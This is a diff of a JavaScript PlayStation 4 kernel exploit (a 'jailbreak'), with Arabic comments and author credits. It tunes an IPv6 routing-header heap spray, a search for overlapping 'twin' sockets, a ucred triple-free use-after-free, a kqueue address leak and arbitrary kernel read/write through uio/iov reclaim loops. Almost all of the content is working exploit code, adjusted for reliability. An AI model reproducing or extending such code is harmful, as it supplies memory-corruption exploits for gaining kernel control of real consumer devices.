@@ -837,31 +837,19 @@ function find_twins() {
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
-
   twins[0] = -1;
   twins[1] = -1;
-
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < MAX_ROUNDS_TWIN) {
-
-    if (typeof debugging !== 'undefined' &&
-        debugging.info &&
-        debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-
-        zeroMemoryCount++;
-        if (zeroMemoryCount >= 5) {
-            log(' Jailbreak failed!');
-            cleanup();
-            return false;
-        }
-
-    } else {
-        zeroMemoryCount = 0;
-    }
-
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        log(' Jailbreak failed!');
+        cleanup();
+        return false;
+      }
+    } else zeroMemoryCount = 0;
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
@@ -870,30 +858,21 @@ function find_twins() {
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
       write32(leak_add, 0); // تعديل رقم 4
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-
       val = read32(leak_add);
       j = val & 0xFFFF;
-
-      if ((val & 0xFFFF0000) === RTHDR_TAG &&
-          i !== j &&
-          j >= 0 && j < ipv6_socks.length) {
-
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
         log('Twins found: [' + i + '] [' + j + ']');
         return true;
       }
     }
-
     count++;
   }
-
   twins[0] = -1;
   twins[1] = -1;
   log('find_twins failed');
@@ -1063,6 +1042,8 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
+  if (exploit_end) return;
+
   let ok = false;
   try { ok = leak_kqueue_safe(); }
   catch(e) { ok = false; }
@@ -1076,10 +1057,12 @@ function exploit_phase_leak() {
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
+  if (exploit_end) return;
+
   try {
     setup_arbitrary_rw();
   } catch(e) {
-    log('R/W setup failed — retrying...');
+    log('R/W setup failed — Restart your ps4');
     return;
   }
 
@@ -1089,10 +1072,14 @@ function exploit_phase_rw() {
 
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
+  
 }
 function exploit_phase_jailbreak() {
-  jailbreak();
+  try { jailbreak(); }
+  catch(e) { log('Jailbreak error.'); }
+
+  log('Jailbreak completed successfully');
+  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1505,8 +1492,8 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 2000;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 20;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 3000;
 
 function trigger_ucred_triplefree() {
   var end = false;
@@ -1642,7 +1629,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 5000;
+  var MAX_KQ = 3000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1655,10 +1642,11 @@ function leak_kqueue() {
     // نحرر triplets[1] عشان نستخدمه في التسريب
     free_rthdr(ipv6_socks[triplets[1]]);
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
+    nanosleep_fun(0);
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    nanosleep_fun(0);
+    
     
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
@@ -1671,14 +1659,12 @@ function leak_kqueue() {
 
     close(kq);
     sched_yield();
-    nanosleep_fun(0);
   }
   
   if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
   }
-  nanosleep_fun(0);
   kl_lock = read64(leak_rthdr.add(0x60));
   kq_fdp  = read64(leak_rthdr.add(0x98));
 
@@ -1750,8 +1736,8 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 5000;
-var KWRITE_MAX_UIO_RECLAIM = 5000;
+var KREAD_MAX_UIO_RECLAIM  = 3000;
+var KWRITE_MAX_UIO_RECLAIM = 3000;
 
 // IOV reclaim max loops
 var KREAD_MAX_IOV_RECLAIM  = 2000;
